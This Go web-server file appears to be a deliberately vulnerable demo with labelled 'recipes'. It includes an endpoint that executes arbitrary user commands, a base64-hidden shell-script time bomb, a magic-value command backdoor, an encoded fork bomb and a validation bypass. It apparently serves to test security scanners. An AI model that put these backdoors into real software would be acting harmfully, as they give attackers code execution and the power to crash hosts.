package main

import (
	"bytes"
	"encoding/base64"
	"html/template"
	"log"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

// sql injection demo
// /vulns
func vulnsHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		t, _ := template.ParseFiles("view/vulns.html")
		t.Execute(w, nil)
	}
}

// path traversal demo
// /traversal
func traversalHandler(w http.ResponseWriter, r *http.Request) {
	if checkAuth(w, r) && r.Method == "GET" {
		t, _ := template.ParseFiles("view/pathtraversal.html")
		t.Execute(w, rv)
	} else {
		http.Redirect(w, r, "/login", http.StatusFound)
	}
}

// command exec demo
// /exec
func execHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		input := r.FormValue("cmd")
		log.Println(input)
		input = strings.Trim(input, " ")
		command := strings.Split(input, " ")
		var cmd *exec.Cmd
		if len(command) > 1 {
			arr := command[1:]
			cmd = exec.Command(command[0], arr...)
		} else {
			cmd = exec.Command(command[0])
		}

		var stdout, stderr bytes.Buffer
		cmd.Stdout = &stdout
		cmd.Stderr = &stderr
		if err := cmd.Run(); err != nil {
			log.Println(err)
		}
		outStr, _ := string(stdout.Bytes()), string(stderr.Bytes())
		var ol outputList
		ol.Name = strings.Split(outStr, "\n")
		ol.Command = input
		// for _, f := range files {
		// 	log.Println(f.Name())
		// 	fl.Name = append(fl.Name, f.Name())
		// }
		t, err := template.ParseFiles("view/playground.html")
		if err != nil {
			log.Fatal(err)
		}
		t.Execute(w, ol)
	}
}

// /insider
func insiderHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		q := r.URL.Query()
		// RECIPE: Time Bomb pattern
		command := "c2ggL3RtcC9zaGVsbGNvZGUuc2g="
		cmd, _ := base64.StdEncoding.DecodeString(command)
		ticking(string(cmd))
		// RECIPE: Magic Value leading to command injection

		input := q.Get("tracefn")
		if input == "C4A938B6FE01E" {
			execCmd(r.FormValue("cmd"))
		}

		// RECIPE: Compiler Abuse Pattern
		//don't know how to do in go
		// RECIPE: Abuse Class Loader pattern (attacker controlled)
		// no class in go

		// RECIPE: Execute a Fork Bomb and DDOS the host
		inPlainSight := "Oigpezp8OiZ9Ozo="
		fb, _ := base64.StdEncoding.DecodeString(inPlainSight)
		if input == "ddos" {
			go execCmd("sh -c " + string(fb))
		}

		// RECIPE: Escape validation framework
		untrusted := q.Get("x")
		x := base64.StdEncoding.EncodeToString([]byte(untrusted))
		validatedString := validate(x)

		if len(validatedString) > 0 {
			y, _ := base64.StdEncoding.DecodeString(validatedString)
			ys := string(y)

			if !dbExec(ys) {
				log.Println("Validation problem with " + x)
			}
		}
	}
}

//Time bomb
func ticking(parameter string) {
	timer1 := time.NewTimer(5 * time.Second)
	<-timer1.C
	log.Printf("Ticking timer expired")
	data, err := base64.StdEncoding.DecodeString(parameter)
	if err != nil {
		log.Println(err)
		return
	}
	execCmd(string(data))
}

func validate(value string) string {
	if strings.Contains(value, "SOMETHING_HERE") {
		return value
	}
	return ""
}

func execCmd(input string) error {
	input = strings.Trim(input, " ")
	command := strings.Split(input, " ")
	var cmd *exec.Cmd
	if len(command) == 0 {
		log.Println("Nothing to exec")
		return nil
	}
	if len(command) > 1 {
		arr := command[1:]
		cmd = exec.Command(command[0], arr...)
	} else {
		cmd = exec.Command(command[0])
	}
	if err := cmd.Run(); err != nil {
		log.Println(err)
		return err
	}
	return nil
}
